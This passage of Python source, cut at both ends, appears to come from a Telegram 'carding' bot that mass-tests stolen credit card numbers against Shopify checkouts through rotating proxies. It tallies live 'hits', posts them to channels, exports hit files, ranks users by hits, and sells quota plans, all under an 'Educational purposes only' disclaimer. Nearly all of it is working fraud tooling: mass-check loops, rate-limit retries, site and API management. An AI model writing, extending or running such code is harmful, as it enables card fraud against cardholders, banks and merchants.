        affordable = remaining + (refreshed["credits"] // 2)
        if affordable <= 0:
            return await msg.answer(f"{pe('unlock')} <b>{sc('No quota')}</b>. {pe('shop')} /shop", parse_mode="HTML")
        use_cards = valid[:min(len(valid), affordable)]
        if len(use_cards) < len(valid):
            await msg.answer(f"{pe('warn')} <b>{sc('Limited to')} {len(use_cards)}/{len(valid)} {sc('due to daily quota')}</b>",
                             parse_mode="HTML")
        for _ in use_cards: consume_quota(uid)
    else:
        use_cards = valid

    task_id = uuid.uuid4().hex[:8]
    cancel_ev = asyncio.Event()
    _mass_tasks[task_id] = cancel_ev
    total = len(use_cards)
    results = {}
    start_time = time.time()

    def render(completed):
        pct = int(100 * completed / total) if total else 0
        bar = make_bar(pct, width=14)
        fancy = make_fancy_bar(pct)
        hits = sum(1 for s, _ in results.values() if s == "HIT")
        decl = sum(1 for s, _ in results.values() if s == "DECLINE")
        errs = sum(1 for s, _ in results.values() if s == "ERROR")
        elapsed = time.time() - start_time
        speed = completed / elapsed if elapsed > 0 else 0
        eta = ((total - completed) / speed) if speed > 0 else 0
        lines = [
            f"{pe('loading')} <b>{sc('Mass Checking')}</b> · {completed}/{total} · <b>{pct}%</b>",
            f"<code>{bar}</code>", f"{fancy}",
            f"<blockquote>{pe('check')} {sc('Hits')}: <b>{hits}</b> · "
            f"{pe('cross2')} {sc('Declined')}: <b>{decl}</b> · "
            f"{pe('warn')} {sc('Errors')}: <b>{errs}</b></blockquote>",
            f"{pe('hourglass')} {sc('ETA')}: <b>{_fmt_eta(eta)}</b> · "
            f"{pe('percent')} <b>{speed:.1f} {sc('cc/s')}</b>",
            "<blockquote>",
        ]
        for cc, (st, rsp) in list(results.items())[-6:]:
            short = cc.split("|")[0][-4:]
            icon = pe("check") if st == "HIT" else pe("cross2") if st == "DECLINE" else pe("warn")
            lines.append(f"{icon} <code>…{short}</code> · {esc(rsp[:30])}")
        lines.append("</blockquote>")
        return "\n".join(lines)

    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[[
        pbtn(sc("Cancel"), icon="stop", color="danger", callback_data=f"mc:cancel:{task_id}")]])
    progress = await msg.answer(render(0), parse_mode="HTML", reply_markup=cancel_kb)

    plan_key = (get_user(uid) or {"plan": "free"})["plan"]
    conc = CONCURRENCY_BY_PLAN.get(plan_key, 2)
    sem = asyncio.Semaphore(conc)
    completed = 0
    hits_count = 0

    async def one(cc):
        nonlocal completed, hits_count
        if cancel_ev.is_set(): return
        async with sem:
            if cancel_ev.is_set(): return
            proxy = pick_user_proxy(uid)
            if not proxy and not bypass_quota:
                results[cc] = ("ERROR", "No live proxy"); completed += 1; return
            try:
                res = await call_api(cc, proxy=proxy)
            except Exception as e:
                res = {"error": str(e), "live": False, "charged": False}
            if cancel_ev.is_set(): return
            if res.get("_site_error"):
                asyncio.create_task(_handle_site_error(bot, res.get("_site", ""), res.get("_site_error_msg", "")))
            if res.get("_proxy_error"):
                asyncio.create_task(_handle_proxy_error(bot, uid, res.get("proxy", ""), res.get("error", "")))
            if "error" in res:
                if res.get("_rate_limited"):
                    results[cc] = ("RETRY", "429 rate limit")
                else:
                    results[cc] = ("ERROR", res["error"])
            elif is_hit(res):
                results[cc] = ("HIT", res.get("response", "Live")); hits_count += 1
                asyncio.create_task(post_hit_public(bot, cc, res, is_charged(res), username))
                asyncio.create_task(post_hit_private(bot, cc, res, is_charged(res), uid=uid, username=username))
                try:
                    async with _get_write_lock():
                        with db() as c:
                            c.execute("INSERT INTO check_logs(uid, cc, response, status, gateway, ts) VALUES (?,?,?,?,?,?)",
                                      (uid, cc, res.get("response", ""), "HIT",
                                       res.get("gateway", "shopify"),
                                       datetime.now(timezone.utc).isoformat()))
                            c.execute("UPDATE users SET total_hits=total_hits+1 WHERE uid=?", (uid,))
                except Exception as e:
                    log.warning(f"mass hit log: {e}")
            else:
                results[cc] = ("DECLINE", res.get("response", "Declined"))
                try:
                    async with _get_write_lock():
                        with db() as c:
                            c.execute("INSERT INTO check_logs(uid, cc, response, status, gateway, ts) VALUES (?,?,?,?,?,?)",
                                      (uid, cc, res.get("response", ""), "DECLINED",
                                       res.get("gateway", "shopify"),
                                       datetime.now(timezone.utc).isoformat()))
                except Exception as e:
                    log.warning(f"mass decl log: {e}")
            completed += 1

    tasks = [asyncio.create_task(one(c)) for c in use_cards]
    last_edit = 0
    for fut in asyncio.as_completed(tasks):
        try: await fut
        except Exception: pass
        if cancel_ev.is_set():
            for t in tasks:
                if not t.done(): t.cancel()
            break
        now_t = time.time()
        if now_t - last_edit >= 1.5 or completed == total:
            last_edit = now_t
            try:
                await progress.edit_text(render(completed), parse_mode="HTML", reply_markup=cancel_kb)
            except TelegramBadRequest: pass
            except Exception: pass

    _mass_tasks.pop(task_id, None)
    elapsed = time.time() - start_time

    retry_cards = [cc for cc, (st, _) in results.items() if st == "RETRY"]
    if retry_cards and not cancel_ev.is_set():
        MAX_RETRIES = 2
        for attempt in range(1, MAX_RETRIES + 1):
            if not retry_cards or cancel_ev.is_set(): break
            try:
                await progress.edit_text(
                    f"{pe('refresh')} <b>{sc('Retrying')} {len(retry_cards)} {sc('rate-limited cards')}</b>\n"
                    f"<blockquote>{sc('Attempt')} {attempt}/{MAX_RETRIES}\n"
                    f"{pe('warn')} {sc('Waiting')} {5 + attempt * 3}s {sc('for rate limit reset')}...</blockquote>",
                    parse_mode="HTML")
            except Exception: pass
            await asyncio.sleep(5 + attempt * 3)
            still_retry = []
            retry_sem = asyncio.Semaphore(1)

            async def retry_one(cc):
                if cancel_ev.is_set(): return
                async with retry_sem:
                    proxy = pick_user_proxy(uid)
                    try: res = await call_api(cc, proxy=proxy)
                    except Exception as e: res = {"error": str(e)}
                    if res.get("_site_error"):
                        asyncio.create_task(_handle_site_error(bot, res.get("_site", ""), res.get("_site_error_msg", "")))
                    if res.get("_proxy_error"):
                        asyncio.create_task(_handle_proxy_error(bot, uid, res.get("proxy", ""), res.get("error", "")))
                    if res.get("_rate_limited"):
                        still_retry.append(cc); return
                    if "error" in res:
                        results[cc] = ("ERROR", res["error"])
                    elif is_hit(res):
                        results[cc] = ("HIT", res.get("response", "Live"))
                        async with _get_write_lock():
                            with db() as c:
                                c.execute("INSERT INTO check_logs(uid, cc, response, status, gateway, ts) VALUES (?,?,?,?,?,?)",
                                          (uid, cc, res.get("response", ""), "HIT",
                                           res.get("gateway", "shopify"),
                                           datetime.now(timezone.utc).isoformat()))
                                c.execute("UPDATE users SET total_hits=total_hits+1 WHERE uid=?", (uid,))
                    else:
                        results[cc] = ("DECLINE", res.get("response", "Declined"))
                        async with _get_write_lock():
                            with db() as c:
                                c.execute("INSERT INTO check_logs(uid, cc, response, status, gateway, ts) VALUES (?,?,?,?,?,?)",
                                          (uid, cc, res.get("response", ""), "DECLINED",
                                           res.get("gateway", "shopify"),
                                           datetime.now(timezone.utc).isoformat()))

            await asyncio.gather(*(retry_one(c) for c in retry_cards))
            retry_cards = still_retry
            if not retry_cards: break
        for cc in retry_cards:
            results[cc] = ("ERROR", "429 rate limit (retries exhausted)")

    hits_list = [(cc, rsp) for cc, (st, rsp) in results.items() if st == "HIT"]
    decl_list = [(cc, rsp) for cc, (st, rsp) in results.items() if st == "DECLINE"]
    err_list  = [(cc, rsp) for cc, (st, rsp) in results.items() if st == "ERROR"]

    if cancel_ev.is_set():
        final = (f"{pe('stop')} <b>{sc('Cancelled')}</b>\n"
                 f"<blockquote>{pe('shop')} {sc('Done')}: <b>{completed}/{total}</b>\n"
                 f"{pe('check')} {sc('Hits')}: <b>{hits_count}</b></blockquote>")
    else:
        final = (f"{pe('check')} <b>{sc('Mass Complete')}</b>\n"
                 f"<blockquote>{pe('shop')} {sc('Total')}: <b>{total}</b>\n"
                 f"{pe('check')} {sc('Hits')}: <b>{hits_count}</b>\n"
                 f"{pe('cross2')} {sc('Declined')}: <b>{len(decl_list)}</b>\n"
                 f"{pe('warn')} {sc('Errors')}: <b>{len(err_list)}</b>\n"
                 f"{pe('hourglass')} {sc('Time')}: <b>{elapsed:.1f}s</b></blockquote>")
    try: await progress.edit_text(final, parse_mode="HTML", reply_markup=None)
    except Exception: pass

    if hits_list:
        content = "\n".join(f"{cc} | {rsp}" for cc, rsp in hits_list)
        fname = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            file = BufferedInputFile(content.encode(), filename=fname)
            await msg.answer_document(file, caption=f"{pe('check')} <b>{len(hits_list)} {sc('HIT')}</b>", parse_mode="HTML")
        except Exception: pass

    async def send_group(title, items, icon):
        if not items: return
        for i in range(0, len(items), 10):
            chunk = items[i:i+10]
            lines = [f"{title} ({i+1}-{i+len(chunk)}/{len(items)})"]
            for cc, rsp in chunk:
                lines.append(f"{icon} <code>{cc}</code> · {esc(rsp[:40])}")
            try:
                await msg.answer("\n".join(lines), parse_mode="HTML")
                await asyncio.sleep(0.3)
            except Exception: pass

    await send_group(f"{pe('check')} <b>{sc('Hits')}</b>", hits_list, pe("check"))
    await send_group(f"{pe('cross2')} <b>{sc('Declined')}</b>", decl_list, pe("cross2"))
    await send_group(f"{pe('warn')} <b>{sc('Errors')}</b>", err_list, pe("warn"))

# ══════════════════════════════════════════════════════════════════════════════
# WELCOME
# ══════════════════════════════════════════════════════════════════════════════
def welcome_text(user_row, first_name):
    brand = get_branding()
    plan_key = user_row["plan"] if user_row["plan"] in PLANS else "free"
    plan_name = sc(PLANS[plan_key]["name"].upper())
    try:
        with db() as c:
            total_users = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"]
    except Exception:
        total_users = 0
    pct = int(100 * user_row["daily_checks"] / PLANS[plan_key]["limit"]) if PLANS[plan_key]["limit"] else 0
    bar = make_bar(pct, width=10)
    return (
        f"{pe('glow_star')} <b>{esc(brand['bot_name'])}</b> {pe('glow_star')}\n"
        f"<blockquote>"
        f"{pe('online')}  {sc('Status')} · <b>{sc('Online')}</b>\n"
        f"{pe('diamond')}  {sc('Mode')} · <b>{sc('Charge / Auth')}</b>\n"
        f"{pe('refresh')}  {sc('Speed')} · <b>{sc('Ultra Fast')}</b>"
        f"</blockquote>\n"
        f"<blockquote>"
        f"{pe('user')}  <b>{esc(first_name)}</b>\n"
        f"{pe('gem')}  {sc('Plan')} · <b>{plan_name}</b>\n"
        f"{pe('chart')}  {sc('Limit')} · <b>{user_row['daily_checks']}/{PLANS[plan_key]['limit']}</b>\n"
        f"<code>{bar}</code> {pct}%\n"
        f"{pe('star')}  {sc('Credits')} · <b>{user_row['credits']}</b>\n"
        f"{pe('heart')}  {sc('Streak')} · <b>{user_row['streak']}d</b>"
        f"</blockquote>\n"
        f"{pe('smile')}  {sc('Members')} · <b>{total_users:,}</b>\n"
        f"{pe('chat')}  {esc(brand['network_username'])}\n"
        f"{pe('pen')}  {sc('Dev')} {esc(brand['dev_username'])}\n"
        f"<i>{sc('Educational purposes only')}</i>"
    )

# ══════════════════════════════════════════════════════════════════════════════
# ROUTER
# ══════════════════════════════════════════════════════════════════════════════
router = Router()

@router.message(CommandStart())
async def cmd_start(msg: Message, command: CommandObject):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid):
        return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")

    if command and command.args and command.args.startswith("ref_"):
        try:
            referrer_id = int(command.args.split("_")[1])
            user = get_user(uid)
            if user and referrer_id != uid and user["referred_by"] == 0:
                ensure_user(referrer_id)
                with db() as c:
                    c.execute("UPDATE users SET referred_by=? WHERE uid=?", (referrer_id, uid))
                    c.execute("UPDATE users SET refer_count=refer_count+1 WHERE uid=?", (referrer_id,))
                    r = c.execute("SELECT refer_count, plan FROM users WHERE uid=?", (referrer_id,)).fetchone()
                    cnt = r["refer_count"]
                    if cnt == 20 and r["plan"] == 'free': upgrade_user(referrer_id, "pro")
                    elif cnt == 40 and r["plan"] in ['free', 'pro']: upgrade_user(referrer_id, "premium")
                    elif cnt == 80 and r["plan"] in ['free', 'pro', 'premium']: upgrade_user(referrer_id, "max")
                    elif cnt == 100: upgrade_user(referrer_id, "unlimited")
        except Exception: pass

    if not await check_force_sub(msg.bot, uid):
        channels = force_channels_list(enabled_only=True)
        kb_rows = []
        for ch in channels:
            link = ch["invite_link"] or f"https://t.me/{ch['chat_id'].lstrip('@')}"
            kb_rows.append([pbtn(f"{sc('Join')} {ch['title'][:25] or sc('Channel')}",
                                  icon="chat", url=link)])
        kb_rows.append([pbtn(sc("Verify"), icon="check", color="success", callback_data="verify_sub")])
        return await msg.answer(
            f"{pe('unlock')} <b>{sc('Access Restricted')}</b>\n"
            f"<blockquote>{sc('Join required channels to continue')}.</blockquote>",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))

    streak = apply_streak(uid)
    user = get_user_or_create(uid, msg.from_user.username or "")
    caption = welcome_text(user, msg.from_user.first_name)
    if streak["reward"]:
        caption += f"\n\n{pe('star')} <b>{sc('Streak Reward')}!</b> {streak['reward']}"
    try:
        await msg.answer_photo(photo=IMG_MAIN, caption=caption, reply_markup=main_menu_kb(uid))
    except Exception:
        await msg.answer(caption, reply_markup=main_menu_kb(uid))

@router.message(Command("stats"))
async def cmd_stats(msg: Message):
    uid = msg.from_user.id
    user = get_user_or_create(uid, msg.from_user.username or "")
    if not user: return
    pk = user["plan"] if user["plan"] in PLANS else "free"
    with db() as c:
        rank = c.execute("SELECT COUNT(*) as n FROM users WHERE total_hits > ?", (user["total_hits"],)).fetchone()["n"] + 1
    rate = (user["total_hits"] / user["total_checks"] * 100) if user["total_checks"] else 0
    text = (
        f"{pe('chart')} <b>{sc('Your Stats')}</b>\n"
        f"<blockquote>{pe('user')} <b>{esc(user['username'] or 'anon')}</b>\n"
        f"{pe('gem')} {sc('Plan')} · <b>{PLANS[pk]['name']}</b>\n"
        f"{pe('star')} {sc('Credits')} · <b>{user['credits']}</b>\n"
        f"{pe('check')} {sc('Total Checks')} · <b>{user['total_checks']:,}</b>\n"
        f"{pe('check2')} {sc('Total Hits')} · <b>{user['total_hits']:,}</b>\n"
        f"{pe('percent')} {sc('Hit Rate')} · <b>{rate:.1f}%</b>\n"
        f"{pe('chart')} {sc('Rank')} · <b>#{rank}</b>\n"
        f"{pe('heart')} {sc('Streak')} · <b>{user['streak']}d</b>\n"
        f"{pe('user')} {sc('Referrals')} · <b>{user['refer_count']}</b></blockquote>")
    await msg.answer(text, parse_mode="HTML", reply_markup=back_kb())

@router.message(Command("top"))
async def cmd_top(msg: Message):
    with db() as c:
        rows = c.execute("SELECT uid, username, total_hits FROM users WHERE total_hits > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    if not rows:
        return await msg.answer(f"{pe('warn')} <b>{sc('No data yet')}</b>", parse_mode="HTML")
    lines = [f"{pe('chart')} <b>{sc('Top Checkers')}</b>\n<blockquote>"]
    for i, r in enumerate(rows, 1):
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
        lines.append(f"{medal} <b>{esc(r['username'] or 'anon')}</b> · {r['total_hits']} hits")
    lines.append("</blockquote>")
    await msg.answer("\n".join(lines), parse_mode="HTML", reply_markup=back_kb())

@router.message(Command("streak"))
async def cmd_streak(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    u = get_user(uid)
    if not u: return
    await msg.answer(
        f"{pe('heart')} <b>{sc('Streak')}</b>\n"
        f"<blockquote>{pe('online')} {sc('Current')}: <b>{u['streak']}d</b>\n"
        f"{pe('chart')} {sc('Last')}: {u['last_streak_date'] or '—'}\n"
        f"{pe('star')} {sc('Credits')}: <b>{u['credits']}</b></blockquote>\n"
        f"{pe('gem')} 7d → +50c · 30d → 1d Pro",
        parse_mode="HTML", reply_markup=back_kb())

@router.message(Command("health"))
async def cmd_health(msg: Message):
    if not is_owner(msg.from_user.id):
        return await msg.answer(f"{pe('cross1')} <b>{sc('Owner only')}</b>", parse_mode="HTML")
    try: health = json.loads(get_setting("site_health", "{}") or "{}")
    except Exception: health = {}
    sites = get_sites()
    if not sites:
        return await msg.answer(f"{pe('warn')} <b>{sc('No sites')}</b>. /addsite", parse_mode="HTML")
    if not health:
        return await msg.answer(f"{pe('loading')} <b>{sc('No data yet')}</b>", parse_mode="HTML")
    lines = [f"{pe('online')} <b>{sc('Site Health')}</b>\n<blockquote>"]
    for site in sites:
        s = health.get(site, "unknown")
        benched = _is_site_benched(site)
        icon = (pe("check") if (s == "ok" and not benched)
                else pe("warn_red") if (s == "down" or benched) else pe("diamond2"))
        lines.append(f"{icon} <code>{site.replace('.myshopify.com', '')}</code> · "
                     f"{s.upper()}{' · BENCHED' if benched else ''}")
    lines.append("</blockquote>")
    await msg.answer("\n".join(lines), parse_mode="HTML", reply_markup=back_kb())

@router.message(Command("cancel"))
async def cmd_cancel(msg: Message):
    n = 0
    for tid, ev in list(_mass_tasks.items()):
        ev.set(); n += 1
    await msg.answer(f"{pe('stop')} <b>{sc('Cancelling')} {n}</b>" if n
                     else f"{pe('warn')} <b>{sc('Nothing running')}</b>", parse_mode="HTML")

@router.message(Command("export"))
async def cmd_export(msg: Message):
    uid = msg.from_user.id
    with db() as c:
        rows = c.execute("SELECT cc, response FROM check_logs WHERE uid=? AND status='HIT' ORDER BY id DESC LIMIT 500", (uid,)).fetchall()
    if not rows:
        return await msg.answer(f"{pe('warn')} <b>{sc('No hits yet')}</b>", parse_mode="HTML")
    content = "\n".join(f"{r['cc']} | {r['response']}" for r in rows)
    try:
        file = BufferedInputFile(content.encode(), filename=f"my_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        await msg.answer_document(file, caption=f"{pe('check')} <b>{len(rows)} {sc('HIT')}</b>", parse_mode="HTML")
    except Exception: pass

@router.message(Command("shop"))
async def cmd_shop(msg: Message):
    text = f"{pe('gem')} <b>{sc('Premium Shop')}</b>\n<blockquote>{pe('star')} {sc('Pay with Stars')}</blockquote>"
    try: await msg.answer_photo(photo=IMG_SHOP, caption=text, parse_mode="HTML", reply_markup=shop_kb())
    except Exception: await msg.answer(text, parse_mode="HTML", reply_markup=shop_kb())

@router.message(Command("check"))
async def cmd_check(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid):
        return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b> <code>/check CC|MM|YY|CVV</code>", parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>", parse_mode="HTML")
    await process_check_logic(msg, cc, msg.bot)

@router.message(Command("bin"))
async def cmd_bin(msg: Message):
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b> <code>/bin 457173</code>", parse_mode="HTML")
    loading = await msg.answer(f"{pe('loading')} <b>{sc('Looking up')}...</b>", parse_mode="HTML")
    data = await lookup_bin(args[1].strip())
    if "error" in data:
        return await loading.edit_text(f"{pe('cross1')} <b>{esc(data['error'])}</b>", parse_mode="HTML")
    country = data.get('Country', {}) or {}
    text = (
        f"{pe('check')} <b>{sc('BIN')}</b> · <code>{args[1].strip()}</code>\n"
        f"<blockquote>{pe('gem')} {sc('Brand')}: {esc(data.get('CardType', 'Unknown'))}\n"
        f"{pe('shop')} {sc('Bank')}: {esc(data.get('Issuer', 'Unknown'))}\n"
        f"{pe('diamond')} {sc('Tier')}: {esc(data.get('CardTier', 'Unknown'))}\n"
        f"{country_flag(country.get('Code', ''))} {sc('Country')}: {esc(country.get('Name', 'Unknown'))}</blockquote>")
    await loading.edit_text(text, parse_mode="HTML")

@router.message(Command("redeem"))
async def cmd_redeem(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(f"{pe('docs')} <b>/redeem CODE</b>", parse_mode="HTML")
    code = args[1].strip().upper()
    result = redeem_key(code, uid)
    if result == "ok":
        return await msg.answer(
            f"{pe('check')} <b>{sc('Key Redeemed')}</b>\n"
            f"<blockquote>{pe('gem')} {sc('Unlimited plan unlocked')}\n"
            f"{pe('star')} <code>{esc(code)}</code></blockquote>", parse_mode="HTML")
    if result == "used":
        return await msg.answer(f"{pe('cross2')} <b>{sc('Key already used')}</b>", parse_mode="HTML")
    with db() as c:
        row = c.execute("SELECT * FROM redeem_codes WHERE code=?", (code,)).fetchone()
        if not row:
            return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid')}</b>", parse_mode="HTML")
        if c.execute("SELECT 1 FROM redeem_log WHERE code=? AND uid=?", (code, uid)).fetchone():
            return await msg.answer(f"{pe('cross2')} <b>{sc('Already used')}</b>", parse_mode="HTML")
        if row["used"] >= row["max_uses"]:
            return await msg.answer(f"{pe('cross2')} <b>{sc('Expired')}</b>", parse_mode="HTML")
        c.execute("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
        c.execute("INSERT INTO redeem_log(code, uid, used_at) VALUES (?,?,?)",
                  (code, uid, datetime.now(timezone.utc).isoformat()))
    upgrade_user(uid, row["plan"], row["days"] if "days" in row.keys() else 30)
    await msg.answer(f"{pe('check')} <b>{sc('Redeemed')}</b>", parse_mode="HTML")

@router.message(Command("history"))
async def cmd_history(msg: Message):
    uid = msg.from_user.id
    with db() as c:
        rows = c.execute("SELECT cc, response, status FROM check_logs WHERE uid=? ORDER BY id DESC LIMIT 10", (uid,)).fetchall()
    if not rows:
        return await msg.answer(f"{pe('docs')} <b>{sc('No history')}</b>", parse_mode="HTML")
    lines = [f"{pe('docs')} <b>{sc('Last Checks')}</b>"]
    for r in rows:
        icon = pe('check') if r['status'] == 'HIT' else pe('cross2')
        lines.append(f"{icon} <code>{r['cc']}</code> · {esc(r['response'][:30])}")
    await msg.answer("\n".join(lines), parse_mode="HTML", reply_markup=back_kb())

@router.message(Command("saved"))
async def cmd_saved(msg: Message):
    uid = msg.from_user.id
    with db() as c:
        rows = c.execute("SELECT cc FROM saved_cards WHERE uid=? ORDER BY id DESC LIMIT 20", (uid,)).fetchall()
    if not rows:
        return await msg.answer(f"{pe('book')} <b>{sc('No saved')}</b>", parse_mode="HTML")
    body = "\n".join(r["cc"] for r in rows)
    await msg.answer(f"{pe('book')} <b>{sc('Saved')} · {len(rows)}</b>\n<blockquote><code>{body}</code></blockquote>",
                     parse_mode="HTML", reply_markup=back_kb())

@router.message(Command("admin"))
async def cmd_admin(msg: Message):
    if not is_admin(msg.from_user.id): return
    await msg.answer(f"{pe('settings')} <b>{sc('Admin Panel')}</b>", parse_mode="HTML",
                     reply_markup=admin_main_kb(msg.from_user.id))

@router.message(Command("sites"))
async def cmd_sites(msg: Message):
    if not is_owner(msg.from_user.id): return
    await msg.answer(f"{pe('shop')} <b>{sc('Sites')}</b>", parse_mode="HTML", reply_markup=sites_kb())

@router.message(Command("addapi"))
async def cmd_addapi(msg: Message):
    if not is_owner(msg.from_user.id): return
    args = msg.text.split(maxsplit=2)
    if len(args) < 2:
        return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b>\n<code>/addapi URL [KEY]</code>", parse_mode="HTML")
    url = args[1].strip()
    key = args[2].strip() if len(args) > 2 else None
    if not (url.startswith("http://") or url.startswith("https://")):
        return await msg.answer(f"{pe('cross1')} <b>{sc('URL must start with http(s)://')}</b>", parse_mode="HTML")
    data = load_endpoints(force=True)
    for ep in data["endpoints"]:
        if ep.get("url") == url and (ep.get("key") or None) == (key or None):
            return await msg.answer(f"{pe('warn')} <b>{sc('Already exists')}</b>", parse_mode="HTML")
    data["endpoints"].append({"url": url, "key": key or None})
    save_endpoints(data)
    await msg.answer(
        f"{pe('check')} <b>{sc('API added')}</b>\n"
        f"<blockquote>{pe('link')} <code>{esc(url)}</code>\n"
        f"{pe('gem')} {sc('Key')}: <code>{esc(key or '—')}</code>\n"
        f"{pe('chart')} {sc('Index')}: <b>{len(data['endpoints'])}</b></blockquote>",
        parse_mode="HTML", reply_markup=apis_kb())

@router.message(Command("rmapi"))
async def cmd_rmapi(msg: Message):
    if not is_owner(msg.from_user.id): return
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(f"{pe('docs')} <b>/rmapi INDEX|URL</b>", parse_mode="HTML")
    target = args[1].strip()
    data = load_endpoints(force=True)
    eps = data["endpoints"]
    if not eps:
        return await msg.answer(f"{pe('warn')} <b>{sc('No endpoints')}</b>", parse_mode="HTML")
    removed = False
    new_eps = list(eps)
    if target.isdigit():
        idx = int(target) - 1
        if 0 <= idx < len(eps):
            new_eps.pop(idx); removed = True
    if not removed:
        for i, ep in enumerate(eps):
            if ep.get("url") == target:
                new_eps.pop(i); removed = True; break
    if not removed:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Not found')}</b>", parse_mode="HTML")
    if not new_eps:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Cannot remove last endpoint')}</b>", parse_mode="HTML")
    data["endpoints"] = new_eps
    if data["active_idx"] >= len(new_eps): data["active_idx"] = 0
    save_endpoints(data)
    await msg.answer(f"{pe('check')} <b>{sc('API removed')}</b>", parse_mode="HTML", reply_markup=apis_kb())

@router.message(Command("apis"))
async def cmd_apis(msg: Message):
    if not is_owner(msg.from_user.id): return
    data = load_endpoints(force=True)
    lines = [f"{pe('link')} <b>{sc('API Endpoints')}</b>\n<blockquote>"]
    for i, ep in enumerate(data["endpoints"]):
        mark = "● ACTIVE" if i == data["active_idx"] else "○"
        key_part = f" · key={esc(ep['key'])}" if ep.get("key") else ""
        lines.append(f"{mark} [{i+1}] <code>{esc(ep['url'])}</code>{key_part}")
    lines.append("</blockquote>")
    await msg.answer("\n".join(lines), parse_mode="HTML", reply_markup=apis_kb())

@router.message(Command("addsite"))
async def cmd_addsite(msg: Message):
    if not is_owner(msg.from_user.id): return
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(f"{pe('docs')} <b>/addsite URL</b>", parse_mode="HTML")
    await _addsite_flow(msg, args[1].strip())

async def _addsite_flow(msg, raw):
    url = _clean_site_url(raw)
    if not url:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid URL')}</b>", parse_mode="HTML")
    if url in get_sites():
        return await msg.answer(f"{pe('warn')} <b>{sc('Site already exists')}</b>", parse_mode="HTML")
    ep = get_active_endpoint()
    if not ep:
        return await msg.answer(f"{pe('cross1')} <b>{sc('No API configured')}</b>", parse_mode="HTML")
    test = await msg.answer(
        f"{pe('loading')} <b>{sc('Testing site via active API')}...</b>\n"
        f"<blockquote><code>{esc(url)}</code></blockquote>", parse_mode="HTML")
    proxy_for_test = None
    try:
        if os.path.exists(PROXY_POOL_FILE):
            with open(PROXY_POOL_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line: proxy_for_test = line; break
    except Exception: pass
    result = await call_api(TEST_CARD, proxy=proxy_for_test, site=url, endpoint=ep)
    if result.get("_proxy_error") and proxy_for_test:
        result = await call_api(TEST_CARD, proxy=None, site=url, endpoint=ep)
    if result.get("error"):
        return await test.edit_text(
            f"{pe('cross1')} <b>{sc('Test failed')}</b>\n"
            f"<blockquote>{pe('warn_red')} {esc(result['error'][:200])}</blockquote>",
            parse_mode="HTML", reply_markup=sites_kb())
    if result.get("classification") == "SITE_ERROR":
        return await test.edit_text(
            f"{pe('cross1')} <b>{sc('Site rejected')}</b>\n"
            f"<blockquote>{pe('shop')} <code>{esc(url)}</code>\n"
            f"{pe('warn_red')} {esc(result.get('message', 'SITE_ERROR')[:200])}</blockquote>",
            parse_mode="HTML", reply_markup=sites_kb())
    add_site(url)
    await test.edit_text(
        f"{pe('check')} <b>{sc('Site added')}</b>\n"
        f"<blockquote>{pe('shop')} <code>{esc(url)}</code>\n"
        f"{pe('diamond')} {sc('Classification')}: <b>{esc(result.get('classification', '—'))}</b>\n"
        f"{pe('gem')} {sc('Response')}: {esc(result.get('message', '')[:120])}</blockquote>",
        parse_mode="HTML", reply_markup=sites_kb())

@router.message(Command("genkey"))
async def cmd_genkey(msg: Message):
    if not is_admin(msg.from_user.id): return
    args = msg.text.split(maxsplit=1)
    count = 1
    if len(args) >= 2:
        try: count = int(args[1].strip())
        except Exception:
            return await msg.answer(f"{pe('cross1')} <b>{sc('Count must be a number')}</b>", parse_mode="HTML")
    if count < 1 or count > 500:
        return await msg.answer(f"{pe('warn')} <b>{sc('Count must be 1..500')}</b>", parse_mode="HTML")
    keys = generate_keys(count)
    preview = "\n".join(keys[:20])
    extra = f"\n{sc('and')} {len(keys) - 20} {sc('more')}..." if len(keys) > 20 else ""
    await msg.answer(
        f"{pe('gem')} <b>{sc('Keys generated')} · {count}</b>\n"
        f"<blockquote><code>{preview}{extra}</code></blockquote>\n"
        f"{pe('check')} {sc('Redeem via')}: <code>/redeem KEY</code>", parse_mode="HTML")

@router.message(Command("msh"))
async def cmd_msh(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    user = get_user(uid)
    if not user or user["banned"]:
        return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>", parse_mode="HTML")
    if not is_admin(uid):
        if not user_proxy_list(uid):
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [pbtn(sc("Add Proxy"), icon="add", color="success", callback_data="proxy:add")],
                [pbtn(sc("Back"), icon="back", callback_data="menu:main")],
            ])
            return await msg.answer(
                f"{pe('cross1')} <b>{sc('Access Denied')}</b>\n"
